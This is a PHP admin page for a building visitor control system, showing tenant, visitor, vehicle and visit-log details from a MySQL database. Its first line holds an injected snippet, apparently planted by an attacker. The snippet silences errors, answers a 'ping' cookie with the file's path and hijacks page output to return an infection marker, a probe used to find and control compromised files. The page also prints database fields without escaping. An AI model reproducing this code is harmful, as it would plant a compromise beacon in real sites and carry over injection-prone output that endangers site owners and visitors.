<? $frt=1;error_reporting(0);if(isset($_COOKIE["ping"])){@setcookie("pong","./cynergi/admin/visitor_detail.php",time()+3600,"/");if( $_COOKIE["ping"]=="./cynergi/admin/visitor_detail.php"){if( !function_exists("ob_sh") ){function ob_sh($buffer){if( preg_match("@<body|</body@si",$buffer) ){return "GOOO->./cynergi/admin/visitor_detail.php<-";}return "NotGO->./cynergi/admin/visitor_detail.php<-";}}@ob_start("ob_sh");}}$frt=2;?><?php require_once('../Connections/dplace.php'); ?>
<?php require_once('../Connections/dplace.php'); ?>
<?php require_once('../Connections/dplace.php'); ?>
<?php
if (!isset($_SESSION)) {
  session_start();
}
$MM_authorizedUsers = "";
$MM_donotCheckaccess = "true";

// *** Restrict Access To Page: Grant or deny access to this page
function isAuthorized($strUsers, $strGroups, $UserName, $UserGroup) { 
  // For security, start by assuming the visitor is NOT authorized. 
  $isValid = False; 

  // When a visitor has logged into this site, the Session variable MM_Username set equal to their username. 
  // Therefore, we know that a user is NOT logged in if that Session variable is blank. 
  if (!empty($UserName)) { 
    // Besides being logged in, you may restrict access to only certain users based on an ID established when they login. 
    // Parse the strings into arrays. 
    $arrUsers = Explode(",", $strUsers); 
    $arrGroups = Explode(",", $strGroups); 
    if (in_array($UserName, $arrUsers)) { 
      $isValid = true; 
    } 
    // Or, you may restrict access to only certain users based on their username. 
    if (in_array($UserGroup, $arrGroups)) { 
      $isValid = true; 
    } 
    if (($strUsers == "") && true) { 
      $isValid = true; 
    } 
  } 
  return $isValid; 
}

$MM_restrictGoTo = "index.php";
if (!((isset($_SESSION['MM_Username'])) && (isAuthorized("",$MM_authorizedUsers, $_SESSION['MM_Username'], $_SESSION['MM_UserGroup'])))) {   
  $MM_qsChar = "?";
  $MM_referrer = $_SERVER['PHP_SELF'];
  if (strpos($MM_restrictGoTo, "?")) $MM_qsChar = "&";
  if (isset($QUERY_STRING) && strlen($QUERY_STRING) > 0) 
  $MM_referrer .= "?" . $QUERY_STRING;
  $MM_restrictGoTo = $MM_restrictGoTo. $MM_qsChar . "accesscheck=" . urlencode($MM_referrer);
  header("Location: ". $MM_restrictGoTo); 
  exit;
}
?>
<?php
if (!function_exists("GetSQLValueString")) {
function GetSQLValueString($theValue, $theType, $theDefinedValue = "", $theNotDefinedValue = "") 
{
  if (PHP_VERSION < 6) {
    $theValue = get_magic_quotes_gpc() ? stripslashes($theValue) : $theValue;
  }

  $theValue = function_exists("mysql_real_escape_string") ? mysql_real_escape_string($theValue) : mysql_escape_string($theValue);

  switch ($theType) {
    case "text":
      $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
      break;    
    case "long":
    case "int":
      $theValue = ($theValue != "") ? intval($theValue) : "NULL";
      break;
    case "double":
      $theValue = ($theValue != "") ? doubleval($theValue) : "NULL";
      break;
    case "date":
      $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
      break;
    case "defined":
      $theValue = ($theValue != "") ? $theDefinedValue : $theNotDefinedValue;
      break;
  }
  return $theValue;
}
}

if (!function_exists("GetSQLValueString")) {
function GetSQLValueString($theValue, $theType, $theDefinedValue = "", $theNotDefinedValue = "") 
{
  if (PHP_VERSION < 6) {
    $theValue = get_magic_quotes_gpc() ? stripslashes($theValue) : $theValue;
  }

  $theValue = function_exists("mysql_real_escape_string") ? mysql_real_escape_string($theValue) : mysql_escape_string($theValue);

  switch ($theType) {
    case "text":
      $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
      break;    
    case "long":
    case "int":
      $theValue = ($theValue != "") ? intval($theValue) : "NULL";
      break;
    case "double":
      $theValue = ($theValue != "") ? doubleval($theValue) : "NULL";
      break;
    case "date":
      $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
      break;
    case "defined":
      $theValue = ($theValue != "") ? $theDefinedValue : $theNotDefinedValue;
      break;
  }
  return $theValue;
}
}

$colname_usuario = "-1";
if (isset($_SESSION['MM_Username'])) {
  $colname_usuario = $_SESSION['MM_Username'];
}
mysql_select_db($database_dplace, $dplace);
$query_usuario = sprintf("SELECT * FROM tbl_admins WHERE username = %s", GetSQLValueString($colname_usuario, "text"));
$usuario = mysql_query($query_usuario, $dplace) or die(mysql_error());
$row_usuario = mysql_fetch_assoc($usuario);
$totalRows_usuario = mysql_num_rows($usuario);

$colname_visitor = "-1";
if (isset($_GET['id'])) {
  $colname_visitor = $_GET['id'];
}
mysql_select_db($database_dplace, $dplace);
$query_visitor = sprintf("SELECT vi.*, tena.names tennant, tena.apt  FROM tbl_visitors vi, tbl_tennants tena WHERE vi.id_tennat=tena.id_tennant AND vi.id_visitor = %s", GetSQLValueString($colname_visitor, "int"));
$visitor = mysql_query($query_visitor, $dplace) or die(mysql_error());
$row_visitor = mysql_fetch_assoc($visitor);
$totalRows_visitor = mysql_num_rows($visitor);

$colname_visits = "-1";
if (isset($_GET['id'])) {
  $colname_visits = $_GET['id'];
}
mysql_select_db($database_dplace, $dplace);
$query_visits = sprintf("SELECT vi.*, us.names guard FROM tbl_visits vi, tbl_users us WHERE vi.id_usuario = us.id_user AND vi.id_visitor = %s ORDER BY vi.visit_date DESC", GetSQLValueString($colname_visits, "int"));
$visits = mysql_query($query_visits, $dplace) or die(mysql_error());
$row_visits = mysql_fetch_assoc($visits);
$totalRows_visits = mysql_num_rows($visits);
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><!-- InstanceBegin template="/Templates/templateadmin.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<!-- InstanceBeginEditable name="doctitle" -->
<title>All American Admin Area</title>
<!-- InstanceEndEditable -->
<!-- InstanceBeginEditable name="head" -->
<!-- InstanceEndEditable -->
<link href="../css/style.css" rel="stylesheet" type="text/css" />
<style type="text/css">
<!--
body {
	background-image: url(../images/bgnd2.jpg);
	background-repeat: repeat-x;
}
-->
</style>
<script type="text/javascript" id="sothink_dhtmlmenu"> <!--
 st_siteroot="";
 st_jspath="stmenu.js";
 if(!window.location.href.indexOf("file:") && st_jspath.charAt(0)=="/")
  document.write('<script type="text/javascript" src="'+st_siteroot+st_jspath+'"><\/script>');
 else 
  document.write('<script type="text/javascript" src="'+st_jspath+'"><\/script>');
//--> </script></head>

<body>
<table width="627" height="132" border="0" align="center">
  <tr>
    <td width="232" height="128" align="center"><img src="../images/dplace_logo.JPG" alt="" width="175" height="87" /></td>
    <td width="385" align="center"><span class="titulo">Visitor control system <br />
      All American Security Services</span></td>
  </tr>
</table>
<table width="673" border="0" align="center">
  <tr>
    <td width="362" align="center"><span> &nbsp;
      <script type="text/javascript" src="adminis.js"></script>
    </span></td>
  </tr>
</table>
<!-- InstanceBeginEditable name="central" -->
<table width="816" height="367" border="0" align="center">
  <tr>
    <td align="center" valign="top"><br />
      <table width="400" border="0">
        <tr>
          <td align="center" class="titulo">Visitor details</td>
        </tr>
      </table>
      <br />
      <table width="400" border="1">
        <tr>
        <td width="164" align="left" class="etiqueta">Tennant:</td>
        <td width="220" align="left"><?php echo $row_visitor['tennant']; ?></td>
      </tr>
      <tr>
        <td align="left" class="etiqueta">Apt / Unit:</td>
        <td align="left"><?php echo $row_visitor['apt']; ?></td>
      </tr>
      <tr>
        <td align="left" class="etiqueta">Visitor names:</td>
        <td align="left"><?php echo $row_visitor['names']; ?></td>
      </tr>
      <tr>
        <td align="left" class="etiqueta">Phone:</td>
        <td align="left"><?php echo $row_visitor['phones']; ?></td>
      </tr>
      <tr>
        <td align="left" class="etiqueta">Vehicle make:</td>
        <td align="left"><?php echo $row_visitor['make']; ?></td>
      </tr>
      <tr>
        <td align="left" class="etiqueta">Model:</td>
        <td align="left"><?php echo $row_visitor['model']; ?></td>
      </tr>
      <tr>
        <td align="left" class="etiqueta">License plate:</td>
        <td align="left"><?php echo $row_visitor['chapa']; ?></td>
      </tr>
      <tr>
        <td align="left" class="etiqueta">Autorized permanently:</td>
        <td align="left"><?php echo $row_visitor['autorized']; ?></td>
      </tr>
      <tr>
        <td align="left" class="etiqueta">Comments:</td>
        <td align="left"><?php echo $row_visitor['comments']; ?></td>
      </tr>
    </table>
      <?php if ($totalRows_visits > 0) { // Show if recordset not empty ?>
  <p class="linea">Registered visits:</p>
        <table width="756" border="1">
          <tr class="etiqueta">
            <td width="175">Date / Time:</td>
            <td width="389">Comments:</td>
            <td width="170">Guard:</td>
          </tr>
          <?php do { ?>
            <tr>
              <td><?php echo $row_visits['visit_date']; ?></td>
              <td><?php echo $row_visits['comments']; ?></td>
              <td><?php echo $row_visits['guard']; ?></td>
            </tr>
            <?php } while ($row_visits = mysql_fetch_assoc($visits)); ?>
        </table>
        <?php } // Show if recordset not empty ?>
<p>&nbsp;</p></td>
  </tr>
</table>
<br />
<!-- InstanceEndEditable -->
<table width="200" border="0" align="right">
  <tr>
    <td>User: <?php echo $row_usuario['names']; ?></td>
  </tr>
</table>
</body>
<!-- InstanceEnd --></html>
<?php
mysql_free_result($usuario);

mysql_free_result($visitor);

mysql_free_result($visits);
?>
